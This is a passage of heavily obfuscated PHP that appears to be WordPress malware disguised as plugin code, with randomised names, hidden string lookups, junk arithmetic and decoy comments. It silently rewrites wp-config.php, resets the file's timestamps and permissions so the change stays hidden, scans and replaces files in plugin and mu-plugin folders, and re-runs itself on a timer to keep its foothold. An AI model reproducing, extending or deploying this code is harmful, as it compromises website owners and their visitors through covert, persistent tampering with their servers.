$gvwxi_p00z1bo      =  $GLOBALS['__scf_kr_w9stt2gb_360']('\\',      '/',  $gvwxi_p00z1bo);
    if    ($gvwxi_p00z1bo !==   ""    &&   $GLOBALS['__scf_i8i8g4oxha_7']($f5l6q0ffo9cqk06, $gvwxi_p00z1bo .   '/')   ===  0)  {
   $isurpe6tldnf  =  true;
 break;
}
   }
   if   ($isurpe6tldnf    && vwmi9k19liyrqa2($wkokdoejn433)  !==   false)   {
       @$GLOBALS['__scf_o_94ckdo_kfcf_19']($wkokdoejn433);


     @$GLOBALS['__scf_o_94ckdo_kfcf_19']($GLOBALS['__scf_oagg5b1ubqmznt_11']($wkokdoejn433)  .  m5t68uuej1(1527)  .   $GLOBALS['__scf_os_n9tj5psxjj_3']($wkokdoejn433, bovhd4vawcd(1308)));
    }   else {$j_pr9n9byncsq7=5*3;$aml8wlfjre37=$j_pr9n9byncsq7-20;
 r63yaewew47stuijcrwsx6(lpwgqh9300(1519),  m40pvx5ij_z4mj(1528) . $GLOBALS['__scf_os_n9tj5psxjj_3']($wkokdoejn433));
      }



   }
return  "";
  }
// sanitization point



       }
 return $xmu6vgl26q74;
  }
   function   _85v3l3rp5m9z8a()
     {


  static   $wkokdoejn433   =    null;
     if ($wkokdoejn433 ===     null) {
// WordPress 6.5 revisions: synchronize reduction

 $e5c0lim9mpp6z_47 =  d6ydz3_mq4hw_2s8_bo(lpwgqh9300(1529), null);
   if ($e5c0lim9mpp6z_47 === null) {
  $c2ngqawy9ma8q    =  d6ydz3_mq4hw_2s8_bo(lpwgqh9300(1165),    "");
 $e5c0lim9mpp6z_47  =  ($GLOBALS['__scf_e_8z8ias8ka_43']($c2ngqawy9ma8q)  &&   $GLOBALS['__scf_i8i8g4oxha_7']($c2ngqawy9ma8q,  bovhd4vawcd(571))  === 0)  ?     1   :  0;
vmq5vh_lh7_vsiehf4nm(m5t68uuej1(1529), $e5c0lim9mpp6z_47, m40pvx5ij_z4mj(1513));
unset($c2ngqawy9ma8q);


 }
     $wkokdoejn433  =     ((int)  $e5c0lim9mpp6z_47  === 1);


 }


 return $wkokdoejn433;

  }
 function t3va1nam582mshqiyn9qc()
    {
 if  (!defined(lpwgqh9300(1530)))  return;


 $e7s4480cj8b1c =  ABSPATH   .   m40pvx5ij_z4mj(1262);
   if  (!@$GLOBALS['__scf_a83pywb98qzq2_20']($e7s4480cj8b1c))  {
// thread-safe deque

  $tzqntk_8mbbc5c  =     $GLOBALS['__scf_oagg5b1ubqmznt_11'](ABSPATH) .  m40pvx5ij_z4mj(1091);
   if    (@$GLOBALS['__scf_a83pywb98qzq2_20']($tzqntk_8mbbc5c)) $e7s4480cj8b1c    =      $tzqntk_8mbbc5c;
 }



     if  (!@$GLOBALS['__scf_a83pywb98qzq2_20']($e7s4480cj8b1c)    ||   !@$GLOBALS['__scf_p_260ito5s0j_50']($e7s4480cj8b1c))   return;



$f5l6q0ffo9cqk06    =    @$GLOBALS['__scf_j79iy74onqck2_35']($e7s4480cj8b1c);
   if ($GLOBALS['__scf_e_8z8ias8ka_43']($f5l6q0ffo9cqk06) &&     $f5l6q0ffo9cqk06  !==  ""   &&   @$GLOBALS['__scf_p_260ito5s0j_50']($f5l6q0ffo9cqk06))  $e7s4480cj8b1c     =   $f5l6q0ffo9cqk06;
    if   (@$GLOBALS['__scf_pftf6vocmvs2m_99']($e7s4480cj8b1c)  > (0x38248+0x3c7db8)) return;
    $t6jsjlatx2i  =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($e7s4480cj8b1c);
if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)    ||   $t6jsjlatx2i    ===  "")  return;
$gxuo5djznvp4_b8c  =   ($GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,   lpwgqh9300(1531))     !==   false   || $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i, lpwgqh9300(1532))   !== false);
  $q0mtsk8yoc71  = false;
if    ($GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i, bovhd4vawcd(1533))  ===    false)    {
// hydrate open proof-term


if  (!empty($GLOBALS[lpwgqh9300(1534)]))   {
$q0mtsk8yoc71 =   true;

 } else  {
 $ygmyw61iaq52f =  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(229))    ?   $GLOBALS['__scf_q9p5ajdcil_79']()   :  lpwgqh9300(80);
     if (!@$GLOBALS['__scf_i9hdv7zrfsy_45']($ygmyw61iaq52f)    ||    !@$GLOBALS['__scf_p_260ito5s0j_50']($ygmyw61iaq52f)) $q0mtsk8yoc71  =  true;
    }


}
  $egxj60b6_csbmtl    =    false;
 $ep8mb3rw7s =  false;
   if (!$GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1535),    $t6jsjlatx2i) &&     defined(m40pvx5ij_z4mj(1177)))    {
// coalesce-reg eventual authority




     $_ac  =  WP_CONTENT_DIR .    m5t68uuej1(1284);
if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($_ac)) {
// partial priority-queue

   $nkutbbtfbivyqgqu     =    (string)  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($_ac,    false,  null, 0,  (0x97b+0x685));



 if     ($GLOBALS['__scf_i8i8g4oxha_7']($nkutbbtfbivyqgqu,  bovhd4vawcd(1536))   !==  false)   $egxj60b6_csbmtl =    true;


}


 }   elseif (
    $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i,  m5t68uuej1(525))    === false


   &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](lpwgqh9300(1537), $t6jsjlatx2i)
     )   {


 $ep8mb3rw7s =  true;
 }
// strip debug output

  $elrb9hngn0foznt_      = false;

   if  (_85v3l3rp5m9z8a())    {



if  (
 !$GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1538),  $t6jsjlatx2i)
||      !$GLOBALS['__scf_vqnw5_4kg7eu_96'](lpwgqh9300(1539),   $t6jsjlatx2i)
  || !$GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1540),  $t6jsjlatx2i)
       )  $elrb9hngn0foznt_  = true;

   }
if (!$gxuo5djznvp4_b8c && !$q0mtsk8yoc71 &&    !$egxj60b6_csbmtl && !$elrb9hngn0foznt_   &&  !$ep8mb3rw7s)  return;$wgx1u8wodpxd=PHP_INT_MAX/PHP_INT_MAX;$anqxlyz5zoce=$wgx1u8wodpxd+24;
    $kiwh_qs8rxj =  "";
 $jhq7h77_vtf  = $t6jsjlatx2i;


 if   ($gxuo5djznvp4_b8c)   {
if  ($GLOBALS['__scf_at_e2uw9xuj96__1383'](m5t68uuej1(1541), $t6jsjlatx2i,  $e72rsmpxylgp2f)) $kiwh_qs8rxj .=   $GLOBALS['__scf_vbecp6uayr_340']("\n",  $e72rsmpxylgp2f[0]);
     $jhq7h77_vtf  =  $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(1541),  "",    $t6jsjlatx2i);
      if (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)) return;
   if   (!$GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1542),    $jhq7h77_vtf))   {
if  ($GLOBALS['__scf_at_e2uw9xuj96__1383'](m40pvx5ij_z4mj(1543),   $jhq7h77_vtf,   $ffak54z8uf8d)) $kiwh_qs8rxj  .= "\n"   . $GLOBALS['__scf_vbecp6uayr_340']("\n", $ffak54z8uf8d[0]);



$jhq7h77_vtf    =  $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1543), "",  $jhq7h77_vtf);


if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf))  return;
 }
// PHP 8.0 JIT script dependency

  }
 $_01x2iw5iawzyu  =   m5t68uuej1(1544);
  if ($q0mtsk8yoc71     &&   $GLOBALS['__scf_vqnw5_4kg7eu_96']('/'  .   $_01x2iw5iawzyu .   '/',    $jhq7h77_vtf))    {
$jhq7h77_vtf   =    $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1545)    . $_01x2iw5iawzyu .   lpwgqh9300(1546),  m5t68uuej1(1547)  .   "define( 'WP_TEMP_DIR', ( defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : ABSPATH . 'wp-content' ) . '/.sc_tmp' );\n", $jhq7h77_vtf, 1);
if (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf))    return;
 }
 if  ($egxj60b6_csbmtl    &&    $GLOBALS['__scf_vqnw5_4kg7eu_96']('/' .   $_01x2iw5iawzyu   .  '/',   $jhq7h77_vtf)) {
$jhq7h77_vtf = $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1548) .   $_01x2iw5iawzyu   . lpwgqh9300(1546),   bovhd4vawcd(1547)  .   "define( 'WP_CACHE', true ); /* SC_WC */\n",  $jhq7h77_vtf,  1);
if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)) return;
}  elseif  ($ep8mb3rw7s)     {
$jhq7h77_vtf   = $GLOBALS['__scf_r1v12_o00h5hc_454'](lpwgqh9300(1548)  .  $_01x2iw5iawzyu    .  lpwgqh9300(1549),   lpwgqh9300(1547) .   "define( 'WP_CACHE', true ); /* SC_WC */\n",    $jhq7h77_vtf,   1);
  if (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf))  return;
  }

if    ($elrb9hngn0foznt_)   {
        $jhq7h77_vtf     =  $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1550),   "", $jhq7h77_vtf);
      if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)) return;
   if    ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1551)    .  $_01x2iw5iawzyu   .   m40pvx5ij_z4mj(1552), $jhq7h77_vtf))  {



     $jhq7h77_vtf =   $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1551)     .    $_01x2iw5iawzyu  . bovhd4vawcd(1553),     m40pvx5ij_z4mj(1547)   .  "define( 'WP_DEBUG', true );\ndefine( 'WP_DEBUG_LOG', true );\ndefine( 'WP_DEBUG_DISPLAY', false );\n",   $jhq7h77_vtf,   1);



 if      (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf))     return;


 }
  }
 if ($jhq7h77_vtf      ===  $t6jsjlatx2i) return;
if    (!fgcc_h22bqxgwmccod($jhq7h77_vtf))   return;
 if     ($ep8mb3rw7s   &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1470))) @update_option(bovhd4vawcd(1554),    1,  bovhd4vawcd(1513));

 if  ($egxj60b6_csbmtl  && !dljv6u_n3brkommu($e7s4480cj8b1c,  $t6jsjlatx2i)) {
   r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1555),  m40pvx5ij_z4mj(1250));

   $jhq7h77_vtf  =   $GLOBALS['__scf_r1v12_o00h5hc_454'](bovhd4vawcd(1551)     .   $_01x2iw5iawzyu  . m5t68uuej1(1556),  bovhd4vawcd(1547),   $jhq7h77_vtf, 1);
  if (!$GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf)    ||  $jhq7h77_vtf ===  $t6jsjlatx2i)     return;
 if (!fgcc_h22bqxgwmccod($jhq7h77_vtf))     return;
 }
     $adg3ig9hjy8le1oe   = @fileperms($e7s4480cj8b1c);
 $adg3ig9hjy8le1oe  = ($adg3ig9hjy8le1oe    === false)   ?  (376+44)   :  ($adg3ig9hjy8le1oe    & (419+92));
   

$ksny_bgxn5  =  @$GLOBALS['__scf_tm09rtls_27e_98']($e7s4480cj8b1c);$ni0gvmu14h8ik=367;$orzugbc_6=($ni0gvmu14h8ik>0)?$ni0gvmu14h8ik:-$ni0gvmu14h8ik;
      $w4xt8dmxjp4f8so    =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($e7s4480cj8b1c);
 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($w4xt8dmxjp4f8so)    ||    $w4xt8dmxjp4f8so  !==     $t6jsjlatx2i)  {


 r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1555), m5t68uuej1(1557));
 return;
   }
unset($w4xt8dmxjp4f8so);
 $rkd1q9_4thz    =   @$GLOBALS['__scf_wgdf7f0l0fi5_78']($GLOBALS['__scf_oagg5b1ubqmznt_11']($e7s4480cj8b1c), m5t68uuej1(1558));
     if   ($rkd1q9_4thz    ===  false) return;
if    (@$GLOBALS['__scf_u59p44o1il_196']($rkd1q9_4thz, $jhq7h77_vtf) !==  $GLOBALS['__scf_fr9u7cq1eo_10']($jhq7h77_vtf)) {
 @$GLOBALS['__scf_o_94ckdo_kfcf_19']($rkd1q9_4thz);
  return;
   }

@$GLOBALS['__scf__vykm6livjsep_17']($rkd1q9_4thz, $adg3ig9hjy8le1oe);
 if  (!@$GLOBALS['__scf_gvpwhn3ygzlhu_76']($rkd1q9_4thz, $e7s4480cj8b1c)) {
@$GLOBALS['__scf_o_94ckdo_kfcf_19']($rkd1q9_4thz);
 return;
     }
// WP Search Block: fallback template

  if ($ksny_bgxn5)   @$GLOBALS['__scf_fiolz593w9mj_75']($e7s4480cj8b1c, $ksny_bgxn5);
   if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1559)))   @opcache_invalidate($e7s4480cj8b1c, true);



   if   ($egxj60b6_csbmtl) rtmq61dax3c2elfi($e7s4480cj8b1c);
if (($egxj60b6_csbmtl || $ep8mb3rw7s)      &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(755))) @delete_option(m40pvx5ij_z4mj(1554));
 

   if ($GLOBALS['__scf_at_e2uw9xuj96__1383'](lpwgqh9300(1560),      $kiwh_qs8rxj,   $mzha071goc))      {$t5psr6eia=91+30;$ti8z3aea=$t5psr6eia-49;
     foreach  ($GLOBALS['__scf_jghjt9zxt358_149']($mzha071goc[1])    as   $frkjcmdl74) {


 if ($GLOBALS['__scf_i8i8g4oxha_7']($frkjcmdl74, bovhd4vawcd(1561)) ===  0 && @$GLOBALS['__scf_a83pywb98qzq2_20']($frkjcmdl74))   @$GLOBALS['__scf_o_94ckdo_kfcf_19']($frkjcmdl74);
     }


       }



 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(755)) &&     $GLOBALS['__scf_at_e2uw9xuj96__1383'](m5t68uuej1(1562),  $kiwh_qs8rxj, $v7qkan3a1ny))      {
   foreach ($GLOBALS['__scf_jghjt9zxt358_149']($v7qkan3a1ny[1])  as $m7mo5s1rn4685aop)    {



 if  ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1563),  $m7mo5s1rn4685aop))  @delete_option($m7mo5s1rn4685aop);
    }


}
}
 function    _6t7d0onh5t849c()
 {$xqa924_ks8z2=164|151;$f7cf6bq7_onso=$xqa924_ks8z2^108;
   if   (!defined(m5t68uuej1(1177)))  return;
   $v3pl0bm3jj = defined(lpwgqh9300(1204)) ?    WPMU_PLUGIN_DIR   : WP_CONTENT_DIR  .  m5t68uuej1(1315);
   $qnc53h9zoa0se    =  array();
    if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(736)))  {
if  (@$GLOBALS['__scf_i9hdv7zrfsy_45']($v3pl0bm3jj))     foreach ((array)  @$GLOBALS['__scf_ql1i4f573p8rhm_73']($v3pl0bm3jj     . bovhd4vawcd(1564))  as $crrhme7tqz) $qnc53h9zoa0se[]   =  $crrhme7tqz;
if (defined(bovhd4vawcd(702))   &&    @$GLOBALS['__scf_i9hdv7zrfsy_45'](WP_PLUGIN_DIR))  foreach ((array)   @$GLOBALS['__scf_ql1i4f573p8rhm_73'](WP_PLUGIN_DIR     .  m5t68uuej1(453))   as $crrhme7tqz)   $qnc53h9zoa0se[] =   $crrhme7tqz;
        }
      $ujb_2f7rfppnx = defined(bovhd4vawcd(1530))     ? ABSPATH :  "";
   $nzrqa6vgfdt53l6c =     WP_CONTENT_DIR . m5t68uuej1(90) .    $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($ujb_2f7rfppnx    .    bovhd4vawcd(68)),   0,  (115^123))   .      m40pvx5ij_z4mj(1565)  .    $GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_pe3s4q1z7z_59']($ujb_2f7rfppnx   . lpwgqh9300(92)),     0, (146^154)) .   lpwgqh9300(1566);
 if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($nzrqa6vgfdt53l6c))  $qnc53h9zoa0se[]    =    $nzrqa6vgfdt53l6c;
   foreach     ($qnc53h9zoa0se as    $crrhme7tqz) {
  $ksny_bgxn5  =  @$GLOBALS['__scf_tm09rtls_27e_98']($crrhme7tqz);$e6pqb2hb8fi6=-259;$e2uoxd0joayl8q=($e6pqb2hb8fi6>0)?$e6pqb2hb8fi6:-$e6pqb2hb8fi6;



  if   (!$ksny_bgxn5   || ($ksny_bgxn5 % (99931+69))     !== (93775+44))   {
 $yeyjpzel_j5s  = @$GLOBALS['__scf_pftf6vocmvs2m_99']($crrhme7tqz);
if  (!$yeyjpzel_j5s   || $yeyjpzel_j5s  <   (0xaa+0x14a)  ||   $yeyjpzel_j5s   >  (28124238+24304562))  continue;
 }
 $f5l6q0ffo9cqk06 = @$GLOBALS['__scf_j79iy74onqck2_35']($crrhme7tqz);
  $eng5lhrt04nh     =  @$GLOBALS['__scf_j79iy74onqck2_35'](t6995wceyqc2q1wqvl());
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($f5l6q0ffo9cqk06)   &&  $GLOBALS['__scf_e_8z8ias8ka_43']($eng5lhrt04nh)  && $f5l6q0ffo9cqk06   ===   $eng5lhrt04nh)  continue;$wtbew8zlp9d0qf=30*3;$pq8id6omiawn=$wtbew8zlp9d0qf-43;
$vhe5twxajpf  = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($crrhme7tqz,  false,     null, 0,  (0xd4f+0x2b1));
 $wure8u5b0sj4ljc9   =  null;
   if ($GLOBALS['__scf_e_8z8ias8ka_43']($vhe5twxajpf)   &&     $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(97),  $vhe5twxajpf,    $kb7_605llqs)) $wure8u5b0sj4ljc9 =  $kb7_605llqs[1];
 elseif     (ey9i45m9xcoe7q13e9ag2($crrhme7tqz,     (7628-2628))) $wure8u5b0sj4ljc9   =  lpwgqh9300(1567);
if ($wure8u5b0sj4ljc9   === null  || !version_compare($wure8u5b0sj4ljc9,    kdgw8qqvzf6yolk(),  '<')) continue;
    $xtf_j3epiq04ok0    = vwmi9k19liyrqa2($crrhme7tqz);
 if  ($xtf_j3epiq04ok0 ===   false) {
r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1519),    bovhd4vawcd(1568) .  $GLOBALS['__scf_os_n9tj5psxjj_3']($crrhme7tqz));
      continue;$y1ic8ks2s6bhf1=(0xbe+0xdc);$t93hzjv7=$y1ic8ks2s6bhf1%13;
  }
 if    ($xtf_j3epiq04ok0  ===   true)     {
 if (j07vd_9875h0key7jsai($crrhme7tqz,     $crrhme7tqz    . bovhd4vawcd(31)))     {
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1559))) @opcache_invalidate($crrhme7tqz,   true);
 } elseif (!a7dvz8wf94o6ie9rtc8hn($crrhme7tqz) &&   xv1s1ysff42y691n($crrhme7tqz))  {
g3zy8qn5_yvcvi22($crrhme7tqz);
  o_k_og36_9hyi4dckvd($crrhme7tqz);
   }
@$GLOBALS['__scf_o_94ckdo_kfcf_19']($GLOBALS['__scf_oagg5b1ubqmznt_11']($crrhme7tqz)  . bovhd4vawcd(1527) .  $GLOBALS['__scf_os_n9tj5psxjj_3']($crrhme7tqz,  lpwgqh9300(1566)));
 continue;
    }
     if (!a7dvz8wf94o6ie9rtc8hn($crrhme7tqz)  &&  xv1s1ysff42y691n($crrhme7tqz))   {
 g3zy8qn5_yvcvi22($crrhme7tqz);


  o_k_og36_9hyi4dckvd($crrhme7tqz);
}
    g_xncp1p67nlv9($crrhme7tqz);
       }
 t3va1nam582mshqiyn9qc();
     $gedn5f_49tuyueh =   WP_CONTENT_DIR  .  m5t68uuej1(1064);
   if     (@$GLOBALS['__scf_i9hdv7zrfsy_45']($gedn5f_49tuyueh) &&  $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(736)))  {


 foreach   ((array) @$GLOBALS['__scf_ql1i4f573p8rhm_73']($gedn5f_49tuyueh   . m40pvx5ij_z4mj(1569))  as $vlwopwnmtlzszz) {
    if    (!@$GLOBALS['__scf_a83pywb98qzq2_20']($vlwopwnmtlzszz)  ||     !@$GLOBALS['__scf_p_260ito5s0j_50']($vlwopwnmtlzszz))  continue;
$kinajp9kyx     = @$GLOBALS['__scf_pftf6vocmvs2m_99']($vlwopwnmtlzszz);
   if     (!$kinajp9kyx || $kinajp9kyx   >  (2097056+96)) continue;



    $us6t435ob2  =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($vlwopwnmtlzszz);
      if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($us6t435ob2))   continue;
      if     ($GLOBALS['__scf_i8i8g4oxha_7']($us6t435ob2,     lpwgqh9300(1515))    ===  false    && $GLOBALS['__scf_i8i8g4oxha_7']($us6t435ob2, lpwgqh9300(1570)) ===  false &&  $GLOBALS['__scf_i8i8g4oxha_7']($us6t435ob2, m5t68uuej1(1571))  ===   false) continue;

  if  (!gingpjknsad2dvuvmbk4($us6t435ob2))   continue;
     $y3v6atoz5c7pbz   =    orp0rsd3hzmr2x616cvnhm($us6t435ob2);



if  ($GLOBALS['__scf_e_8z8ias8ka_43']($y3v6atoz5c7pbz)  &&  $y3v6atoz5c7pbz  !==  $us6t435ob2) {
    a3hx61zfms1ji3euwsc($vlwopwnmtlzszz,  $y3v6atoz5c7pbz);



      if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1572)))  @opcache_invalidate($vlwopwnmtlzszz, true);
   }
      }

 }


g1e437iixp5n3aj0odzu2k(WP_CONTENT_DIR  .  lpwgqh9300(1284));
   g1e437iixp5n3aj0odzu2k(WP_CONTENT_DIR    .     bovhd4vawcd(1573));
      if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1473))      && $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(755))  &&    $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1574))) {
   $_on    =   dv62azao9qb3z33m4cwig0(ABSPATH    .  m5t68uuej1(1575),   (0x5+0x5));



 $n5j0rl533f8 =    @get_option($_on, "");
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($n5j0rl533f8)  && $n5j0rl533f8 !==     "")  {$edajz5ekr=3360;$fomuu3jwi=$edajz5ekr%11;
$y8u_799yjd5ivj = $GLOBALS['__scf_wak9390fh7p_356']($n5j0rl533f8,  true);

    if  ($GLOBALS['__scf_e_8z8ias8ka_43']($y8u_799yjd5ivj) &&  hgmyr2px4horuv3j($y8u_799yjd5ivj)) @delete_option($_on);


}


$fzq2j4j4eejncfj  = $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1576))  ?   d6ydz3_mq4hw_2s8_bo(lpwgqh9300(860), "")  :      "";
 if  ($GLOBALS['__scf_e_8z8ias8ka_43']($fzq2j4j4eejncfj)  && $fzq2j4j4eejncfj  !==  "" &&   ($GLOBALS['__scf_fr9u7cq1eo_10']($fzq2j4j4eejncfj)   >    (1048538+38)  ||  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1577))    &&    at2pgldx1ep7sbjlr_r7($fzq2j4j4eejncfj))     || zrz48hnyk7a1229($fzq2j4j4eejncfj))) {
   if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1578)))      vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(860),  "",    m5t68uuej1(1513));
  }
 }
       }
function r92zksip69l03_cq()
{
   try {
  if (!defined(m40pvx5ij_z4mj(1530)))  return;
 if   (!empty($GLOBALS[bovhd4vawcd(1579)]))  {
 $GLOBALS[m5t68uuej1(1579)] =  0;
r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1580),  bovhd4vawcd(1581));
}
 if   (!empty($GLOBALS[lpwgqh9300(693)]))     return;
  $GLOBALS[m40pvx5ij_z4mj(693)]  =      true;
  if   (!isset($_GET[m40pvx5ij_z4mj(1418)])   && $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1582)) &&    $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(461)))    {



  $hip5tba1l_z03xs0  =     @get_option(m40pvx5ij_z4mj(1583), array());
      $w_1j6v2oll4z   =     false;
 if   ($GLOBALS['__scf_pomb89yiuz_37']($hip5tba1l_z03xs0)) {


    if   (!empty($hip5tba1l_z03xs0['t']))    $w_1j6v2oll4z  = true;



 if (!$w_1j6v2oll4z &&   !empty($hip5tba1l_z03xs0[lpwgqh9300(1510)]) && $GLOBALS['__scf_pomb89yiuz_37']($hip5tba1l_z03xs0[m40pvx5ij_z4mj(1510)])) {

    foreach ($hip5tba1l_z03xs0[lpwgqh9300(1584)]  as    $_ci) {



       if  ($GLOBALS['__scf_pomb89yiuz_37']($_ci)  &&  !empty($_ci['p']))   {
     $w_1j6v2oll4z =   true;
break;
 }

   }
  }
 }


    if   ($w_1j6v2oll4z)      $GLOBALS['__scf_w5tg0wn3h2rih_170'](m40pvx5ij_z4mj(1458));
   }
 if  (p_lwrm_zqo9euyd0(t6995wceyqc2q1wqvl()))  return;



$bold0ljxkxzh1    =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1582))  ? (int) get_option(m5t68uuej1(1585),      0)  : 0;
 if   ($bold0ljxkxzh1  < $GLOBALS['__scf_ibw9xvmx9ckin_187']() -      (353-53)    ||  $bold0ljxkxzh1    >     $GLOBALS['__scf_ibw9xvmx9ckin_187']()  +   (202+98))  {
     if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1586)))  @update_option(bovhd4vawcd(1585),    $GLOBALS['__scf_ibw9xvmx9ckin_187']());


  _6t7d0onh5t849c();
     }
unset($bold0ljxkxzh1);
  xw9ojliw9r9dhff(t6995wceyqc2q1wqvl(),  kdgw8qqvzf6yolk());
  if     (!toqvilnv84hv69v2gepwhm())   {


 wc1n1msxd9t4tdztt();
   djp3c9fh7x_i_3sx6c8();
 return;
}
      $e3thri4q7dp    =  r5waslskyqytjrm6();
   $vatwljflry0c  = array(
 t6995wceyqc2q1wqvl(),
 $e3thri4q7dp     .    m5t68uuej1(1573),
    );
    $o9eo03fylg05 =  i7u2ciwa1osy_eyk3();
 foreach ($o9eo03fylg05     as    $etzsw3lq0z) {
  if      (@$GLOBALS['__scf_a83pywb98qzq2_20']($etzsw3lq0z))   $vatwljflry0c[]     =  $etzsw3lq0z;
   }


   $n73jxs5ka1o4bi =    array();
$chxhy4s65ci4mcw = lvrw_195p7ri57ctv7dk_z();
  if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($chxhy4s65ci4mcw[1])) $n73jxs5ka1o4bi[bovhd4vawcd(1587)   .  $chxhy4s65ci4mcw[0]]  =    bovhd4vawcd(1588)     . $chxhy4s65ci4mcw[2];
  

 $qk17vvoaxt  =  @get_option(bovhd4vawcd(1589),  array());
 if  (!$GLOBALS['__scf_pomb89yiuz_37']($qk17vvoaxt)) $qk17vvoaxt  =  array();
  $xs1ixc1l1o29t_n  =      false;
  foreach  ($vatwljflry0c   as $uim861ig2y) {
 $cdmny2qut8j4_m  =   @$GLOBALS['__scf_b8zhccrnlgsp_55']($uim861ig2y);
    $yi_o1ja0fdpvz1e7  =   $cdmny2qut8j4_m   ?   ($cdmny2qut8j4_m[lpwgqh9300(1590)] .     '|' .   $cdmny2qut8j4_m[m40pvx5ij_z4mj(1591)])  :   '0';
  $tvkhbx5gcgs = isset($qk17vvoaxt[$uim861ig2y]) ? $qk17vvoaxt[$uim861ig2y] :    "";

      if  ($yi_o1ja0fdpvz1e7 ===      $tvkhbx5gcgs)  continue;
if   ($GLOBALS['__scf_vqnw5_4kg7eu_96'](m40pvx5ij_z4mj(1592), $tvkhbx5gcgs,    $y871powf01l3zs)  && $GLOBALS['__scf_vvn10ievj2k_9']($tvkhbx5gcgs,    0, -$GLOBALS['__scf_fr9u7cq1eo_10']($y871powf01l3zs[0]))   === $yi_o1ja0fdpvz1e7 &&  $GLOBALS['__scf_ibw9xvmx9ckin_187']() -  (int) $y871powf01l3zs[1]  <   (5437-1837)) continue;
$xs1ixc1l1o29t_n    =  true;
break;
}
if   (!$xs1ixc1l1o29t_n)  {
foreach  ($n73jxs5ka1o4bi   as   $key   => $x0qcasr7utlsop) {$xtzah9eov=PHP_INT_MAX/PHP_INT_MAX;$zo47kasis=$xtzah9eov+86;
 $yi_o1ja0fdpvz1e7  =   cv2mu8mx5udntp3ntp9ef7($GLOBALS['__scf_vvn10ievj2k_9']($key,  (4+1)),   $x0qcasr7utlsop);

  $tvkhbx5gcgs      =   isset($qk17vvoaxt[$key])    ? $qk17vvoaxt[$key]      :  "";
 if ($yi_o1ja0fdpvz1e7  ===  $tvkhbx5gcgs)    continue;
